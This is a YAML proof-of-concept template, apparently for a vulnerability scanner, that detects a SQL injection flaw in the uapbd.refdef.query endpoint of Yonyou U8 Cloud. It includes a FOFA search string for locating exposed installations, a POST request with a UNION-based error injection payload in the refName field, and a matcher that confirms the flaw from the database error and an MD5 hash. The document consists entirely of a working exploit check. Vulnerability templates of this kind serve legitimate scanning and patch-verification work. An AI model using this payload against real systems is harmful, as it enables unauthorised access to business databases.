id: poc-yaml-yongyou-u8-cloud-uapbd-refdef-query-sqli
info:
  name: 用友U8 Cloud uapbd.refdef.query SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8cloud
  fofa: app="用友-U8-Cloud"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N
  headers:
    Content-Type: application/json
  data: '{"refName":"1%'' UNION ALL SELECT 1,CONVERT(INT,sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))),1--
    "}'
  expression: status_code == 200 && contains(body,"转换成数据类型 int 时失败") && contains(body,"U8C返回信息")
    && contains(body,"0x" + t2)
transport: http
